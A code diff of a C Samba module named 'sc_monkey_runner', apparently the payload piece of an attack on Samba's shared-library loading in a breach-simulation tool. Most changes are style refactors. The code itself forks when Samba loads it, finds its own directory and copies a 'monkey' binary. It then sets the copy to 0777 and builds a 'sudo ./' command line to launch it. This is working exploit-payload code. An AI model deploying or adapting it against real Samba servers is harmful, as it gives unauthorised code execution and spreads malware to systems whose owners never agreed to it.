@@ -7,11 +7,11 @@
 #include "sc_monkey_runner.h"
 
 #ifdef __x86_64__
-	#define ARC_IS_64
+	#define ARCH_IS_64
 #endif
 
 #ifdef _____LP64_____
-	#define ARC_IS_64
+	#define ARCH_IS_64
 #endif
 
 #define LINE_MAX_LENGTH (2048)
@@ -19,7 +19,7 @@
 
 int samba_init_module(void)
 {
-#ifdef ARC_IS_64
+#ifdef ARCH_IS_64
 	const char RUNNER_FILENAME[] = "sc_monkey_runner64.so";
 	const char MONKEY_NAME[] = "monkey64";
 	const char MONKEY_COPY_NAME[] = "monkey64_2";
@@ -30,23 +30,24 @@ int samba_init_module(void)
 #endif
 	const char RUNNER_RESULT_FILENAME[] = "monkey_runner_result";
 	const char COMMANDLINE_FILENAME[] = "monkey_commandline.txt";
-	const char ACCESS_MODE_STRING[] = "0777";
+	const int ACCESS_MODE_STRING = 0777;
 	const char RUN_MONKEY_CMD[] = "sudo ./";
 	
 	int found = 0;
-	char modulePathLine[LINE_MAX_LENGTH];
+	char modulePathLine[LINE_MAX_LENGTH] = {'\0'};
 	char commandline[LINE_MAX_LENGTH] = {'\0'};
-	char* monkeyDirectory;
-	char* fileNamePointer;
-    int accessMode;
-	FILE * pFile;
+	char* monkeyDirectory = NULL;
+	char* fileNamePointer = NULL;
+    int accessMode = 0;
+	FILE * pFile = NULL;
 	pid_t pid = 0;
-	int monkeySize;
-	void* monkeyBinary;
+	int monkeySize = 0;
+	void* monkeyBinary = NULL;
+	struct stat fileStats;
 	
 	pid = fork();
 	
-	if (pid != 0)
+	if (0 != pid)
 	{
 		// error or this is parent - nothing to do but return.
 		return 0;
@@ -54,7 +55,7 @@ int samba_init_module(void)
 	
 	// Find fullpath of running module.
 	pFile = fopen("/proc/self/maps", "r");
-	if (pFile == NULL)
+	if (NULL == pFile)
 	{
 		return 0;
 	}
@@ -70,7 +71,7 @@ int samba_init_module(void)
 	fclose(pFile);
 	
 	// We can't find ourselves in module list
-	if (found == 0)
+	if (0 == found)
 	{
 		return 0;
 	}
@@ -78,14 +79,14 @@ int samba_init_module(void)
 	monkeyDirectory = strchr(modulePathLine, '/');
 	*fileNamePointer = '\0';
 	
-	if (chdir(monkeyDirectory) < 0)
+	if (0 != chdir(monkeyDirectory))
 	{
 		return 0;
 	}
 	
 	// Write file to indicate we're running
 	pFile = fopen(RUNNER_RESULT_FILENAME, "w");
-	if (pFile == NULL)
+	if (NULL == pFile)
 	{
 		return 0;
 	}
@@ -95,44 +96,37 @@ int samba_init_module(void)
 	
 	// Read commandline
 	pFile = fopen(COMMANDLINE_FILENAME, "r");
-	if (pFile == NULL)
+	if (NULL == pFile)
 	{
 		return 0;
 	}
 	
 	// Build commandline
-	strcpy(commandline, RUN_MONKEY_CMD);
-	strcpy(commandline + strlen(RUN_MONKEY_CMD), MONKEY_COPY_NAME);
-	commandline[strlen(RUN_MONKEY_CMD) + strlen(MONKEY_COPY_NAME)] = ' ';
+	strncat(commandline, RUN_MONKEY_CMD, sizeof(RUN_MONKEY_CMD) - 1);
+	strncat(commandline, MONKEY_COPY_NAME, sizeof(MONKEY_COPY_NAME) - 1);
+	strncat(commandline, " ", 1);
 	
-	fread(commandline + strlen(RUN_MONKEY_CMD) + strlen(MONKEY_COPY_NAME) + 1, 1, LINE_MAX_LENGTH, pFile);
+	fread(commandline + strlen(commandline), 1, LINE_MAX_LENGTH, pFile);
 	fclose(pFile);
+	
+	if (0 != stat(MONKEY_NAME, &fileStats))
+	{
+		return 0;
+	}
+	
+	monkeySize = (int)fileStats.st_size;
 	
 	// Copy monkey to new file so we'll own it.
 	pFile = fopen(MONKEY_NAME, "rb");
 	
-	if (pFile == NULL)
+	if (NULL == pFile)
 	{
 		return 0;
 	}
-	
-	if (0 != fseek (pFile, 0 ,SEEK_END))
-	{
-		return 0;
-	}
-	
-	monkeySize = ftell(pFile);
-	
-	if (-1 == monkeySize)
-	{
-		return 0;
-	}
-	
-	rewind(pFile);
 	
 	monkeyBinary = malloc(monkeySize);
 	
-	if (0 == monkeyBinary)
+	if (NULL == monkeyBinary)
 	{
 		return 0;
 	}
@@ -141,7 +135,7 @@ int samba_init_module(void)
 	fclose(pFile);
 	
 	pFile = fopen(MONKEY_COPY_NAME, "wb");
-	if (pFile == NULL)
+	if (NULL == pFile)
 	{
 		free(monkeyBinary);
 		return 0;
@@ -151,8 +145,7 @@ int samba_init_module(void)
 	free(monkeyBinary);
 	
 	// Change monkey permissions
-    accessMode = strtol(ACCESS_MODE_STRING, 0, 8);
-    if (chmod(MONKEY_COPY_NAME, accessMode) < 0)
+    if (0 != chmod(MONKEY_COPY_NAME, ACCESS_MODE_STRING))
     {
         return 0;
     }
